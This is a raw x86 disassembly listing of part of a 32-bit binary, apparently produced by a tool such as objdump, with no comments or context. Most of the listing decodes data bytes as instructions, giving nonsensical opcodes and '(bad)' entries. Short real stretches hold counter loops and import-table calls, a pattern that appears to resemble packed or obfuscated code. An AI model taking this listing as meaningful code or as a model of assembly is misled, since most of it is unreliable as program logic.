  4082c1:	mov    bl,0x3
  4082c3:	call   0xd252:0x7a08c0f7
  4082ca:	les    edi,FWORD PTR [edx-0x4af0e859]
  4082d0:	lods   al,BYTE PTR ds:[esi]
  4082d1:	and    ah,BYTE PTR [eax]
  4082d3:	jmp    0x4082e5
  4082d5:	fstp   TBYTE PTR [edi-0x67]
  4082d8:	fwait
  4082d9:	bound  esp,QWORD PTR [edi+0x61a36e54]
  4082df:	xchg   edx,eax
  4082e0:	cwde   
  4082e1:	aam    0x33
  4082e3:	cld    
  4082e4:	jb     0x408288
  4082e6:	push   es
  4082e7:	pop    es
  4082e8:	sti    
  4082e9:	scas   eax,DWORD PTR es:[edi]
  4082ea:	cmp    esi,DWORD PTR [edi]
  4082ec:	fwait
  4082ed:	stc    
  4082ee:	ds jne 0x4082fa
  4082f1:	adc    DWORD PTR [esi+ebp*8],edi
  4082f4:	mov    DWORD PTR [esi-0x7d],0xb214d975
  4082fb:	pop    eax
  4082fc:	xchg   DWORD PTR [eax-0x44cded6d],esp
  408302:	mov    ebx,DWORD PTR [ecx+eax*4]
  408305:	popf   
  408306:	sbb    eax,0xd5fa5efe
  40830b:	ss daa 
  40830d:	adc    al,0xc8
  40830f:	adc    DWORD PTR [eax-0x7fbeef16],ebx
  408315:	icebp  
  408316:	inc    edi
  408317:	imul   ebx,DWORD PTR [edx-0x32],0xdd45268f
  40831e:	push   edi
  40831f:	nop
  408320:	push   edx
  408321:	popf   
  408322:	jns    0x40837b
  408324:	daa    
  408325:	pop    ebp
  408326:	sahf   
  408327:	add    ecx,DWORD PTR [eax]
  408329:	out    0xfe,eax
  40832b:	ins    BYTE PTR es:[edi],dx
  40832c:	out    0x75,al
  40832e:	xor    bl,BYTE PTR [edx-0x57]
  408331:	pop    ds
  408332:	mov    ebp,0xa102e401
  408337:	adc    eax,0x6a8336bc
  40833c:	lods   eax,DWORD PTR ds:[esi]
  40833d:	mov    dl,0x8e
  40833f:	jecxz  0x4083ab
  408341:	adc    DWORD PTR [ebx],ecx
  408343:	and    cl,ch
  408345:	mov    bl,0xa1
  408347:	pop    ecx
  408348:	and    BYTE PTR ds:0xc3941424,bl
  40834e:	fmul   DWORD PTR ds:0xa01bcaf6
  408354:	xor    eax,edx
  408356:	cmp    eax,0x69ca0b32
  40835b:	je     0x4072df
  408361:	mov    eax,DWORD PTR [ebp-0x10]
  408364:	add    DWORD PTR [eax],0x7403504
  40836a:	jmp    0x4072df
  40836f:	mov    eax,DWORD PTR [ebp-0x1c]
  408372:	cmp    DWORD PTR [eax],edi
  408374:	je     0x4072df
  40837a:	mov    eax,0x800f1c81
  40837f:	jmp    0x4072e6
  408384:	push   ebp
  408385:	mov    ebp,esp
  408387:	sub    esp,0x60
  40838a:	mov    DWORD PTR ds:0x4344ef,0x17
  408394:	cmp    DWORD PTR ds:0x4344ef,0x0
  40839b:	je     0x4083fd
  4083a1:	cmp    DWORD PTR ds:0x4344ef,0x6
  4083a8:	jne    0x4083c8
  4083ae:	push   0x434553
  4083b3:	push   0x4c23
  4083b8:	push   0x3f32
  4083bd:	push   0x4c42
  4083c2:	call   DWORD PTR ds:0x413288
  4083c8:	cmp    DWORD PTR ds:0x4344ef,0x7
  4083cf:	jne    0x4083e0
  4083d5:	mov    eax,ds:0x4344ef
  4083da:	dec    eax
  4083db:	mov    ds:0x4344ef,eax
  4083e0:	mov    eax,ds:0x4344ef
  4083e5:	dec    eax
  4083e6:	mov    ds:0x4344ef,eax
  4083eb:	jmp    0x408394
  4083f0:	movzx  eax,BYTE PTR ds:0x434613
  4083f7:	sbb    DWORD PTR ds:0x434503,eax
  4083fd:	mov    eax,DWORD PTR [ebp+0x8]
  408400:	sbb    DWORD PTR ds:0x434587,0x4487
  40840a:	push   ebx
  40840b:	xor    ebx,ebx
  40840d:	or     ebx,DWORD PTR ds:0x434583
  408413:	sbb    DWORD PTR ds:0x434613,ebx
  408419:	push   esi
  40841a:	jmp    0x4086a2
  40841f:	jmp    DWORD PTR [ecx]
  408421:	lahf   
  408422:	xchg   esp,eax
  408423:	mov    eax,ds:0xe73db59c
  408428:	sbb    bh,bl
  40842a:	(bad)  
  40842b:	dec    esi
  40842c:	xchg   esi,eax
  40842d:	lahf   
  40842e:	or     bh,bl
  408430:	fidivr WORD PTR [esi+0x7e]
  408433:	loope  0x4084ad
  408435:	jle    0x4084b5
  408437:	sti    
  408438:	sti    
  408439:	out    0xfc,al
  40843b:	dec    esi
  40843c:	ret    0x5a6d
  40843f:	hlt    
  408440:	dec    ebx
  408441:	dec    edi
  408442:	cmp    bl,ah
  408444:	cdq    
  408445:	sub    BYTE PTR [eax-0x2c],bl
  408448:	add    bh,BYTE PTR [edi]
  40844a:	aad    0xd6
  40844c:	and    DWORD PTR ds:0x16b87ef0,esi
  408452:	and    bl,BYTE PTR [ebx-0x3c]
  408455:	fstp   TBYTE PTR [ebx+0x3a]
  408458:	dec    edi
  408459:	push   0x48
  40845b:	dec    ebp
  40845c:	add    DWORD PTR [esi+0x78],ecx
  40845f:	jl     0x40847c
  408461:	popf   
  408462:	sub    eax,0xa7f2b490
  408467:	ins    DWORD PTR es:[edi],dx
  408468:	cmp    al,0x4
  40846a:	sub    eax,0x8c8a0e7a
  40846f:	jge    0x4083ff
  408471:	or     eax,0x88ed93fa
  408476:	enter  0xfc2e,0xf3
  40847a:	mov    ?,WORD PTR [ebp+0x5db9633d]
  408480:	out    0x4a,eax
  408482:	sbb    eax,0x5f3c36cb
  408487:	rcr    BYTE PTR [edx+edi*4-0x5d],1
  40848b:	xchg   ebx,eax
  40848c:	stos   BYTE PTR es:[edi],al
  40848d:	xchg   edi,eax
  40848e:	pop    ebp
  40848f:	cmc    
  408490:	jno    0x408511
  408492:	enter  0x7331,0xf9
  408496:	xor    eax,0xfafcb605
  40849b:	in     eax,dx
  40849c:	mov    ch,0x49
  40849e:	mov    eax,0x9a6ad1e3
  4084a3:	sbb    cl,BYTE PTR [ebp-0x176a5a34]
  4084a9:	in     al,dx
  4084aa:	jge    0x4084c9
  4084ac:	(bad)  
  4084ae:	leave  
  4084af:	aaa    
  4084b0:	or     ecx,DWORD PTR [eax+eiz*2+0x1b]
  4084b4:	ret    
  4084b5:	repnz push edi
  4084b7:	xchg   esi,eax
  4084b8:	(bad)  
  4084ba:	mov    ah,0x47
  4084bc:	aas    
  4084bd:	or     DWORD PTR [ebp-0x5d],esp
  4084c0:	jmp    0xcf3f:0xfb7951f8
  4084c7:	mov    bl,0xc9
  4084c9:	jecxz  0x40850d
  4084cb:	je     0x4084b2
  4084cd:	and    eax,0x7ee7d957
  4084d2:	mov    ecx,0x409a1882
  4084d7:	int    0x6f
  4084d9:	arpl   si,sp
  4084db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084dc:	push   0xffffffb3
  4084de:	fst    DWORD PTR [ecx-0x63]
  4084e1:	xor    DWORD PTR [edx],ebp
  4084e3:	mov    ecx,0x6d1f573c
  4084e8:	int3   
  4084e9:	(bad)  
  4084ea:	mov    al,ds:0x253779f8
  4084ef:	retf   0x9abb
  4084f2:	and    cl,0xb2
  4084f5:	out    dx,eax
  4084f6:	int3   
  4084f7:	mov    BYTE PTR [eax-0x187b6e4d],ch
  4084fd:	call   esp
  4084ff:	aad    0xee
  408501:	push   ebx
  408502:	cli    
  408503:	pop    es
  408504:	adc    esi,ebx
  408506:	push   edx
  408507:	mov    dl,0x87
  408509:	sub    DWORD PTR [esi+0x201c39ff],0xa26975f5
  408513:	mov    al,ds:0xe0314455
  408518:	clc    
  408519:	or     DWORD PTR [ebx],ebx
  40851b:	xchg   esp,eax
  40851c:	pop    ds
  40851d:	mov    ah,0x13
  40851f:	loopne 0x40850b
  408521:	rcl    BYTE PTR [ebx],1
  408523:	fsub   st(2),st
  408525:	(bad)  [edi]
  408527:	imul   ebx,DWORD PTR [ecx+ebp*8-0x2c],0x4c
  40852c:	and    DWORD PTR [edx-0x1],edi
  40852f:	popa   
  408530:	rcr    BYTE PTR [eax+0x3821e20],1
  408536:	call   0xa68a2f50
  40853b:	and    DWORD PTR es:[edi],eax
  40853e:	call   0xef4b:0x7b9c34bd
  408545:	sub    ebp,DWORD PTR [ebp-0xc]
  408548:	pusha  
  408549:	and    edi,DWORD PTR [eax]
  40854b:	out    0x3e,eax
  40854d:	add    al,0xf
  40854f:	int    0x80
  408551:	pop    edi
  408552:	mov    esp,0x150d779b
  408557:	pop    esi
  408558:	pop    ebx
  408559:	jo     0x408575
  40855b:	xlat   BYTE PTR ds:[ebx]
  40855c:	mov    eax,ds:0xfe5f3493
  408561:	lods   eax,DWORD PTR ds:[esi]
  408562:	xchg   esp,eax
  408563:	fsubrp st(7),st
  408565:	ret    
  408566:	test   al,0x28
  408568:	cmp    ch,BYTE PTR [ebx-0xb703553]
  40856e:	test   eax,0x6fba07c7
  408573:	sbb    eax,0xdd22dbfa
  408578:	and    dh,0x45
  40857b:	ds sbb ecx,esi
  40857e:	jecxz  0x408588
  408580:	pusha  
  408581:	mov    ch,0xb6
  408583:	pop    ecx
  408584:	sub    esi,DWORD PTR [edi-0x5f]
  408587:	js     0x408583
  408589:	ret    0x1385
  40858c:	cmp    ah,BYTE PTR [ebx]
  40858e:	popf   
  40858f:	xchg   ebp,eax
  408590:	cmp    BYTE PTR [ecx],bh
  408592:	xlat   BYTE PTR ds:[ebx]
  408593:	mov    bl,0xec
  408595:	scas   al,BYTE PTR es:[edi]
  408596:	icebp  
  408597:	sub    al,BYTE PTR [ebp-0x127d32a3]
  40859d:	inc    bx
  40859f:	jl     0x4085dd
  4085a1:	mov    ch,BYTE PTR [ecx+0x70e82a8e]
  4085a7:	pop    esp
  4085a8:	std    
  4085a9:	push   ds
  4085aa:	inc    edi
  4085ab:	cmp    dl,BYTE PTR [ecx-0x5ed31ea]
  4085b1:	jns    0x4085c7
  4085b3:	add    edx,DWORD PTR [ecx+esi*1]
  4085b6:	in     al,0x30
  4085b8:	jmp    0x1c87dcc2
  4085bd:	scas   al,BYTE PTR es:[edi]
  4085be:	jge    0x40858b
  4085c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085c1:	push   ebp
  4085c2:	or     DWORD PTR [eax],ecx
  4085c4:	popa   
  4085c5:	push   es
  4085c6:	adc    al,0xc0
  4085c8:	daa    
  4085c9:	add    edi,DWORD PTR ss:[ebx]
  4085cc:	cmp    esp,eax
  4085ce:	push   ebx
  4085cf:	clc    
  4085d0:	jne    0x40860f
  4085d2:	retf   0x28d1
  4085d5:	call   0x51f178aa
  4085da:	test   BYTE PTR ds:0x1546a873,dh
  4085e0:	jp     0x40856a
  4085e2:	(bad)  
  4085e3:	retf   0x27bb
  4085e6:	cmp    bl,BYTE PTR es:[edx]
  4085e9:	xor    BYTE PTR [edi],ah
  4085eb:	fnstsw WORD PTR [edx-0x6d]
  4085ee:	adc    al,BYTE PTR [esp+esi*2]
  4085f1:	aam    0x7c
  4085f3:	in     eax,0xf3
  4085f5:	data16 fisubr WORD PTR [ebp+0x498304a3]
  4085fc:	fistp  DWORD PTR [edi-0x6b3693f9]
  408602:	outs   dx,BYTE PTR ds:[esi]
  408603:	xchg   esi,eax
  408604:	lea    edx,[ecx-0x1f97d513]
  40860a:	je     0x4085e2
  40860c:	and    al,0x98
  40860e:	mov    edx,0xff3a9d05
  408613:	push   edi
  408614:	outs   dx,BYTE PTR ds:[esi]
  408615:	in     eax,0x4e
  408617:	jmp    0xbb13:0x48d8ce01
  40861e:	mov    ebp,0xa4a4b83f
  408623:	lea    esp,[eax]
  408625:	ins    BYTE PTR es:[edi],dx
  408626:	(bad)  
  408627:	cmp    cl,BYTE PTR [eax]
  408629:	gs fwait
  40862b:	dec    ecx
  40862c:	out    dx,al
  40862d:	dec    esp
  40862e:	mov    ah,0x1a
  408630:	push   ebx
  408631:	imul   ecx,eax,0x7
  408634:	mov    eax,ds:0x1251dd07
  408639:	in     al,dx
  40863a:	mov    bp,WORD PTR [edx+0x17]
  40863e:	inc    ebx
  40863f:	mov    ebp,0x1541af06
  408644:	dec    ecx
  408645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408646:	sub    al,0x20
  408648:	scas   eax,DWORD PTR es:[edi]
  408649:	inc    edi
  40864a:	ss out 0x36,al
  40864d:	adc    al,0x2
  40864f:	lock mov ds:0x47d99218,eax
  408655:	fsub   st(3),st
  408657:	in     al,dx
  408658:	add    DWORD PTR [edi],ebp
  40865a:	push   ebp
  40865b:	mov    ebx,0x5a48ccbc
  408660:	push   0x425bd883
  408665:	test   BYTE PTR [ebx],al
  408667:	aad    0xe1
  408669:	push   cs
  40866a:	rcr    BYTE PTR gs:[edx-0x6a],cl
  40866e:	mov    al,cl
  408670:	xchg   edx,eax
  408671:	jle    0x40865b
  408673:	mov    esi,edi
  408675:	dec    ebp
  408676:	add    DWORD PTR [edi-0x3],ebx
  408679:	scas   al,BYTE PTR es:[edi]
  40867a:	in     al,0x2c
  40867c:	mov    bh,0xf8
  40867e:	jmp    DWORD PTR [ecx-0x3c]
  408681:	test   al,0x16
  408683:	pop    edi
  408684:	xor    ebp,DWORD PTR [ebp-0x265c3259]
  40868a:	xchg   edi,eax
  40868b:	fwait
  40868c:	inc    ebx
  40868d:	ret    
  40868e:	push   eax
  40868f:	lods   al,BYTE PTR ds:[esi]
  408690:	jmp    0x86b17b83
  408695:	xlat   BYTE PTR ds:[ebx]
  408696:	pop    ss
  408697:	imul   esi,DWORD PTR [eax],0x1a504799
  40869d:	lods   al,BYTE PTR ds:[esi]
  40869e:	jae    0x4086bd
  4086a0:	xchg   ebx,eax
  4086a1:	jecxz  0x408661
  4086a3:	push   ecx
  4086a4:	or     BYTE PTR [ecx+0x7],dl
  4086a7:	and    DWORD PTR ds:0x4344ef,0x0
  4086b1:	mov    ebx,DWORD PTR ds:0x4344ef
  4086b7:	inc    ebx
  4086b8:	mov    DWORD PTR ds:0x4344ef,ebx
  4086be:	cmp    DWORD PTR ds:0x4344ef,0x8
  4086c5:	jne    0x4086d6
  4086cb:	push   0x2214
  4086d0:	call   DWORD PTR ds:0x41328c
  4086d6:	cmp    DWORD PTR ds:0x4344ef,0x7
  4086dd:	jne    0x4086f2
  4086e3:	xor    ebx,ebx
  4086e5:	or     ebx,DWORD PTR ds:0x4344ef
  4086eb:	inc    ebx
  4086ec:	mov    DWORD PTR ds:0x4344ef,ebx
  4086f2:	cmp    DWORD PTR ds:0x4344ef,0x11
  4086f9:	jb     0x4086b1
  4086ff:	xor    eax,esi
  408701:	or     ebx,0x4275
  408707:	mov    ebx,0x327299
  40870c:	add    eax,ebx
  40870e:	push   edi
  40870f:	sub    edi,DWORD PTR ds:0x434583
  408715:	mov    DWORD PTR [ebp-0x18],eax
  408718:	xor    edi,0x561f
  40871e:	jmp    0x4089a6
  408723:	push   esi
  408724:	ja     0x40875d
  408726:	push   ecx
  408727:	aaa    
  408728:	push   ecx
  408729:	jo     0x40879c
  40872b:	(bad)  
  40872c:	mov    eax,0x47c13fc8
  408731:	mov    ch,0xdf
  408733:	outs   dx,BYTE PTR ds:[esi]
  408734:	fdivr  DWORD PTR [esi+0x7e]
  408737:	loope  0x4087b1
  408739:	jle    0x4087b9
  40873b:	(bad)  
  40873c:	push   edx
  40873d:	jnp    0x408787
  40873f:	(bad)  
  408741:	add    ebp,0xde5b6e24
  408747:	loopne 0x40878c
  408749:	sub    DWORD PTR [esi+0x5575280a],edx
  40874f:	push   0xbe999ba4
  408754:	daa    
  408755:	xchg   BYTE PTR [ebp-0x6a],ah
  408758:	sub    al,0x92
  40875a:	pusha  
  40875b:	ret    0x5178
  40875e:	mov    ch,0x28
  408760:	push   edi
  408761:	gs add al,0xc1
  408764:	arpl   ax,ax
  408766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408767:	xchg   esi,eax
  408768:	mov    ebx,0xbaa1628c
  40876d:	fnstcw WORD PTR [eax]
  40876f:	xchg   DWORD PTR [esi-0x2e6f2eb5],ebp
  408775:	jle    0x408714
  408777:	out    dx,eax
  408778:	sbb    ecx,DWORD PTR [edi+0x21]
  40877b:	push   0xb
  40877d:	inc    esp
  40877e:	jg     0x408760
  408780:	adc    BYTE PTR [esi+0x16],cl
  408783:	dec    ebx
  408784:	sub    eax,0x83ce5abd
  408789:	or     cl,dh
  40878b:	mov    ah,0x95
  40878d:	jo     0x4087fc
  40878f:	jg     0x408761
  408791:	push   cs
  408792:	std    
  408793:	mov    ds:0xc43488a7,eax
  408798:	bound  esp,QWORD PTR [ecx]
  40879a:	pop    es
  40879b:	pop    ds
  40879c:	scas   al,BYTE PTR es:[edi]
  40879d:	mov    ds:0x3af8aef8,eax
  4087a2:	out    dx,eax
  4087a3:	loope  0x408741
  4087a5:	jbe    0x408818
  4087a7:	xchg   esp,eax
  4087a8:	sahf   
  4087a9:	dec    edx
  4087aa:	stc    
  4087ab:	stos   DWORD PTR es:[edi],eax
  4087ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087ad:	adc    DWORD PTR [edi-0x4e07cea3],ebx
  4087b3:	shr    al,1
  4087b5:	sbb    al,0x60
  4087b7:	shl    ch,1
  4087b9:	jle    0x408741
  4087bb:	pop    esi
  4087bc:	mov    edi,0x65124730
  4087c1:	cmp    ecx,DWORD PTR [ebx+0x66]
  4087c4:	pop    ss
  4087c5:	dec    ecx
  4087c6:	cmc    
  4087c7:	jmp    0x4087e9
  4087c9:	loope  0x4087aa
  4087cb:	std    
  4087cc:	(bad)  
  4087cd:	lods   eax,DWORD PTR ds:[esi]
  4087ce:	xor    DWORD PTR [ecx+0x7c],ecx
  4087d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087d2:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087d4:	or     eax,eax
  4087d6:	xor    eax,0x645e961c
  4087db:	sub    bh,BYTE PTR ds:0x5f06836e
  4087e1:	xchg   ebp,eax
  4087e2:	fisub  WORD PTR [ebx+0x38b94fba]
  4087e8:	pop    ecx
  4087e9:	mov    ?,WORD PTR [ecx]
  4087eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087ec:	retf   0xe624
  4087ef:	mov    WORD PTR [edi],?
  4087f1:	stc    
  4087f2:	inc    esp
  4087f3:	xchg   esi,eax
  4087f4:	xchg   esi,eax
  4087f5:	mov    BYTE PTR [esi-0xe2ccf7b],dh
  4087fb:	xor    al,0x5c
  4087fd:	and    eax,0x4d9975e6
  408802:	mov    edi,0x8fd2fdc2
  408807:	fadd   DWORD PTR [ecx-0x7798facc]
  40880d:	jo     0x4087c3
  40880f:	pop    eax
  408810:	fwait
  408811:	sub    bl,dh
  408813:	or     DWORD PTR [ecx],ebp
  408815:	mov    ebp,0x595cd07d
  40881a:	sbb    eax,0x108162e2
  40881f:	xor    BYTE PTR [ebx],al
  408821:	inc    edx
  408822:	outs   dx,DWORD PTR ds:[esi]
  408823:	xor    DWORD PTR [ecx],eax
  408825:	(bad)  
  408826:	clc    
  408827:	pop    eax
  408828:	pop    ss
  408829:	je     0x408811
  40882b:	hlt    
  40882c:	mov    al,ds:0x8b5105d7
  408831:	sub    al,0x76
  408833:	jo     0x408847
  408835:	ins    DWORD PTR es:[edi],dx
  408836:	xor    ch,BYTE PTR [edx]
  408838:	mov    ebp,DWORD PTR [ebx]
  40883a:	pushf  
  40883b:	out    0x2c,al
  40883d:	scas   eax,DWORD PTR es:[edi]
  40883e:	retf   
  40883f:	push   cs
  408840:	rol    cl,0x8f
  408843:	jmp    0xba715a2d
  408848:	aaa    
  408849:	shr    bl,1
  40884b:	cwde   
  40884c:	pushf  
  40884d:	jbe    0x4087d1
  40884f:	sub    BYTE PTR [edi+esi*4+0x43],al
  408853:	mov    cl,0x77
  408855:	mov    ebx,0xd6ad73c1
  40885a:	call   0x4a525acb
  40885f:	mov    edi,0x149db661
  408864:	mov    edx,0xc56c375c
  408869:	aad    0x76
  40886b:	pop    edi
  40886c:	ins    DWORD PTR es:[edi],dx
  40886d:	loope  0x4087f7
  40886f:	add    DWORD PTR [ebx+edi*8],0x6321ff13
  408876:	std    
  408877:	push   0x7ed86b7a
  40887c:	cmc    
  40887d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40887e:	mov    ds:0x7f48b090,al
  408883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408884:	and    DWORD PTR [edi-0x48],esi
  408887:	sbb    eax,DWORD PTR [ecx+ebp*8]
  40888a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40888b:	stos   BYTE PTR es:[edi],al
  40888c:	dec    ecx
  40888d:	arpl   WORD PTR [esi+0x67],bp
  408890:	out    0x40,al
  408892:	bound  ebx,QWORD PTR [eax+0x352f256f]
  408898:	cmp    BYTE PTR [ecx],dl
  40889a:	test   BYTE PTR [esi-0x30],al
  40889d:	pop    ecx
  40889e:	cmp    cl,BYTE PTR [ecx+0x41]
  4088a1:	push   ecx
  4088a2:	dec    edx
  4088a3:	xor    eax,0xa0d8633c
  4088a8:	mov    ebp,0xeac38e92
  4088ad:	pop    ebx
  4088ae:	and    dh,BYTE PTR [esi+ebx*4]
  4088b1:	xor    DWORD PTR [edi+ebx*8-0x578ef316],edi
  4088b8:	mov    ds:0x5d29c0ac,al
  4088bd:	test   DWORD PTR [edi],ebp
  4088bf:	push   esi
  4088c0:	adc    DWORD PTR [di-0x4e],esi
  4088c4:	xchg   dh,dh
  4088c6:	sub    edx,DWORD PTR [esi-0x4feec39b]
  4088cc:	adc    al,0xdb
  4088ce:	sbb    BYTE PTR [eax],0x79
  4088d1:	mov    ds:0x8a6753dd,al
  4088d6:	cmp    ch,bl
  4088d8:	iret   
  4088d9:	inc    edx
  4088da:	mov    dl,0x51
  4088dc:	cmc    
  4088dd:	fadd   DWORD PTR [ebp+0xc]
  4088e0:	sub    DWORD PTR [edx+edi*4+0x90860c9],ebp
  4088e7:	ficom  DWORD PTR [esi]
  4088e9:	mul    BYTE PTR [ebx+ebp*8]
  4088ec:	cdq    
  4088ed:	xchg   edx,eax
  4088ee:	gs jns 0x4088c8
  4088f1:	addr16 xchg esp,eax
  4088f3:	(bad)  [ebp+0x60]
  4088f6:	sahf   
  4088f7:	dec    ecx
  4088f8:	cmc    
  4088f9:	mov    eax,0xb331ef63
  4088fe:	lock mov WORD PTR [ebx+0x25],fs
  408902:	(bad)  
  408903:	in     al,dx
  408904:	sub    bl,BYTE PTR [ecx]
  408906:	retf   
  408907:	mov    cl,BYTE PTR [edi+0x62]
  40890a:	mov    dl,0x6d
  40890c:	mov    esp,0x59baa43c
  408911:	clc    
  408912:	sub    cl,al
  408914:	sub    cl,bl
  408916:	sbb    al,0xcb
  408918:	cmp    BYTE PTR [edi+0x4fe9e5d1],bh
  40891e:	mov    esp,0x7cd03c2
  408923:	xchg   ecx,eax
  408924:	sbb    eax,0xf23b1c29
  408929:	push   esi
  40892a:	sbb    BYTE PTR [esi-0x12],dl
  40892d:	xchg   DWORD PTR [esi-0x16],ecx
  408930:	shl    BYTE PTR [eax-0x5f2a03c8],1
  408936:	stos   BYTE PTR es:[edi],al
  408937:	sub    eax,0xd5522e23
  40893c:	in     eax,0x36
  40893e:	lock adc BYTE PTR [edi+0x4e],ah
  408942:	mov    eax,?
  408944:	xchg   DWORD PTR cs:[esi-0x79659b12],ebx
  40894b:	shl    DWORD PTR [ebx-0x18],cl
  40894e:	ja     0x40897f
  408950:	fstp   TBYTE PTR [esi-0x2f]
  408953:	pushf  
  408954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408955:	cmc    
  408956:	lea    edi,[ecx]
  408958:	test   al,0x2d
  40895a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40895b:	mov    eax,0x980774d1
  408960:	cmp    bl,bh
  408962:	mov    DWORD PTR [esi+edx*1],edx
  408965:	ja     0x408995
  408967:	fdiv   st(0),st
  408969:	(bad)  
  40896a:	lods   al,BYTE PTR ds:[esi]
  40896b:	mov    eax,0x597eb574
  408970:	and    ebp,DWORD PTR [ebx-0x50]
  408973:	pop    edx
  408974:	out    dx,al
  408975:	push   ds
  408976:	fldenv [ecx+0x56245e92]
  40897c:	inc    ebx
  40897d:	push   ebp
  40897e:	(bad)  
  40897f:	mov    bh,al
  408981:	pop    ebx
  408982:	adc    DWORD PTR [esi],ecx
  408984:	ins    DWORD PTR es:[edi],dx
  408985:	push   edi
  408986:	movlps QWORD PTR [edx+0x5bcef579],xmm4
  40898d:	adc    eax,0x96e4944e
  408992:	ret    0x2ef6
  408995:	dec    ebx
  408996:	dec    ebx
  408997:	pop    ss
  408998:	mov    dl,0xd6
  40899a:	adc    edx,DWORD PTR [ebx+0x51eec425]
  4089a0:	aaa    
  4089a1:	sub    dl,dl
  4089a3:	adc    al,bh
  4089a5:	mov    dh,0x8b
  4089a7:	jge    0x4089b1
  4089a9:	xor    edi,esi
  4089ab:	not    DWORD PTR ds:0x4344eb
  4089b1:	mov    DWORD PTR [ebp-0xc],0xf89c85f6
  4089b8:	mov    DWORD PTR [ebp-0x10],0xf89c8736
  4089bf:	add    edi,ebx
  4089c1:	jmp    0x4092cd
  4089c6:	cmp    edi,0x3f
  4089c9:	jmp    0x408c51
  4089ce:	adc    dl,BYTE PTR [ebx-0x524adccb]
  4089d4:	sbb    al,0xb3
  4089d6:	xchg   ebx,eax
  4089d7:	pop    ds
  4089d8:	adc    cl,cl
  4089da:	mov    ecx,0xd1375fb5
  4089df:	fstp   TBYTE PTR [esi+0x7e]
  4089e2:	loope  0x408a5c
  4089e4:	jle    0x408a64
  4089e6:	stc    
  4089e7:	sti    
  4089e8:	sbb    esp,edi
  4089ea:	mov    dh,0x9c
  4089ec:	xor    eax,DWORD PTR [eax]
  4089ee:	jg     0x408a05
  4089f0:	cwde   
  4089f1:	jecxz  0x4089d1
  4089f3:	and    eax,edx
  4089f5:	rol    DWORD PTR [ebp-0x79e1132b],0x58
  4089fc:	(bad)  
  4089fd:	rcl    BYTE PTR [edi-0x16e03102],1
  408a03:	xor    eax,0xdac4dd4a
  408a08:	lea    edx,[ebp+0x13]
  408a0b:	jecxz  0x4089aa
  408a0d:	dec    eax
  408a0e:	inc    edi
  408a0f:	aam    0xac
  408a11:	mov    esp,0x266ab54e
  408a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a17:	dec    edx
  408a18:	out    dx,al
  408a19:	add    BYTE PTR [ebp-0x6126efd6],bh
  408a1f:	(bad)  
  408a20:	pmulhuw mm7,QWORD PTR [ebx-0x75]
  408a24:	xchg   ebx,eax
  408a25:	jns    0x408a3d
  408a27:	pop    es
  408a28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a29:	and    cl,BYTE PTR [edi-0x5be4cd30]
  408a2f:	retf   0xd711
  408a32:	add    ebp,ecx
  408a34:	jge    0x408aaf
  408a36:	xchg   ecx,eax
  408a37:	(bad)  [esi-0x48]
  408a3a:	xor    dl,al
  408a3c:	cwde   
  408a3d:	adc    BYTE PTR [edi+0x5277d19f],ch
  408a43:	inc    edi
  408a44:	lods   eax,DWORD PTR ds:[esi]
  408a45:	add    DWORD PTR [eax],ebx
  408a47:	mov    ebp,0x61b050e0
  408a4c:	adc    ebp,DWORD PTR [ecx-0x3a0dc8d7]
  408a52:	mov    ah,0xc4
  408a54:	jge    0x408a51
  408a56:	mov    esp,0x5ca90893
  408a5b:	test   DWORD PTR [edx+0x95d1444],0x2627142d
  408a65:	xchg   edi,eax
  408a66:	ss call 0x9f06:0x2f2741f3
  408a6e:	bound  ebp,QWORD PTR [eax+ebx*2]
  408a71:	mov    edx,0x407730fa
  408a76:	jecxz  0x4089f8
  408a78:	pop    eax
  408a79:	push   edi
  408a7a:	neg    dh
  408a7c:	cli    
  408a7d:	fstp   TBYTE PTR [ecx]
  408a7f:	cmp    eax,0x185c1a2b
  408a84:	jmp    0x4c19:0x83a4684e
  408a8b:	and    al,0xe0
  408a8d:	aaa    
  408a8e:	push   cs
  408a8f:	sub    edi,DWORD PTR [edi-0x55]
  408a92:	add    esi,DWORD PTR [esi+edx*2+0x77b5368d]
  408a99:	jg     0x408a97
  408a9b:	test   al,0x62
  408a9d:	shl    DWORD PTR [ecx*4+0x4ec4864e],1
  408aa4:	int3   
  408aa5:	jns    0x408a53
  408aa7:	ror    edx,0xa5
  408aaa:	dec    ecx
  408aab:	or     BYTE PTR [edx-0x635e477],al
  408ab1:	inc    ebp
  408ab2:	(bad)  
  408ab3:	push   ss
  408ab4:	sub    eax,0xdeb902be
  408ab9:	sbb    ebx,edi
  408abb:	std    
  408abc:	(bad)  
  408abd:	bound  eax,QWORD PTR [ebx-0x1b529970]
  408ac3:	das    
  408ac4:	mov    ds:0xd0b1955e,eax
  408ac9:	push   eax
  408aca:	jecxz  0x408a9f
  408acc:	mov    DWORD PTR [esi+0x3a2c3f7e],0x14503ca9
  408ad6:	sub    al,0x69
  408ad8:	dec    ecx
  408ad9:	popf   
  408ada:	inc    eax
  408adb:	add    eax,0xdcba39d3
  408ae0:	in     al,dx
  408ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ae2:	mov    bh,cl
  408ae4:	stc    
  408ae5:	repnz cmp ah,ch
  408ae8:	mov    bh,0x9f
  408aea:	popa   
  408aeb:	push   0xffffff80
  408aed:	sbb    al,BYTE PTR [ecx+0x46]
  408af0:	sbb    BYTE PTR [edi+ecx*8-0x8],ah
  408af4:	es xchg BYTE PTR gs:[ebp+eiz*8+0x67c46a3],al
  408afd:	mov    eax,ds:0xeaf96a54
  408b02:	jmp    0x6f8e:0x5aad68df
  408b09:	add    DWORD PTR [eax-0x2e],0x75
